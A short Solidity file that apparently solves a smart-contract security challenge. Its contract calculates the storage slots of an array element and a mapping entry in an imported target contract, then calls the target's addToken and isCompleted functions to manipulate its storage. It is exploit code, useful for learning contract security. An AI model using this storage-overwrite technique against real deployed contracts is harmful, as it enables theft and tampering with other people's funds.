//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./1.sol";
// 1.增加数组长度。2.算出数组对应元素的存储插槽。3.算出映射对应元素的存储插槽
contract Attract{
    array arr;
    constructor(array addr) {
        arr = addr;
    }
    function getTokensslot(uint256 slot,uint256 index) public pure  returns(bytes32) {
        return bytes32(uint256(keccak256(abi.encodePacked(slot))) + index * 3);
    }
    function getMapslot(uint256 x) public view returns(bytes32) {
        return keccak256(abi.encodePacked(uint256(uint160(address(this))),x));
    }
    function attract() public {
        arr.addToken(address(this), 0);
        arr.isCompleted(getTokensslot(0,1), getMapslot(1), 1 , address(this));
    }
}